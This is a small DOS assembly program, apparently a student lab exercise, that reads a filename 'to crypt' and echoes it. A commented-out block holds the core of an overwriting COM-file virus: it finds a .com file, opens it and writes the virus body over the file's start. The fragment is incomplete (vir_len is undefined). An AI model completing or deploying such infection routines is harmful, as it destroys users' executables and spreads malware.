.model tiny
.code
org 100h
start:

    ; получение DTA (в bx)
    mov ah, 2Fh
    int 21h

    ; вывод запроса на ввод
    mov ah, 09h
    mov dx, offset input_msg
    int 21h

    ; буферизированный ввод
    mov dx, offset maxlen
    mov ah, 0ah
    int 21h

    ; печать переход
    mov dl, 10
    mov ah, 02h
    int 21h ;new line feed

    ; добавление бакса
    mov al, len
    cbw ; extend al to ax
    mov bx, ax
    mov filename+bx, '$' ;нужно засунуть в конец

    lea dx, filename
    mov ah, 09h
    int 21h

    ; ; поиск .com-ника
    ; lea dx, filename
    ; mov ah, 4Eh
    ; int 21h

    ; ; вывод имени найденного файла
    ; mov dx, bx
    ; add dx, 1Eh
    ; mov ah, 09h
    ; int 21h

    ; lea dx, dta
    ; mov ah, 09h
    ; int 21h

    ; ; банк Открытие файла
    ; mov ax,3D02h
    ; mov dx,9Eh
    ; int 21h

    ; ; записываем тело вируса в начало файла
    ; xchg ax,bx
    ; mov dx,100h
    ; mov ah,40h
    ; mov cl,vir_len
    ; int 21h

    ; ; закрываем файл и выходим
    ; mov ah,3Eh
    ; int 21h
    ; ret

    mov ah, 4Ch
    int 21h


    maxlen db 20
    len db 0
    filename db 20 dup(?)
    file_mask db 'lab3v.com', 0
    err_msg db 'Error, can not find or open such file.','$'
    input_msg db 'Hello, input filename to crypt:','$'

end start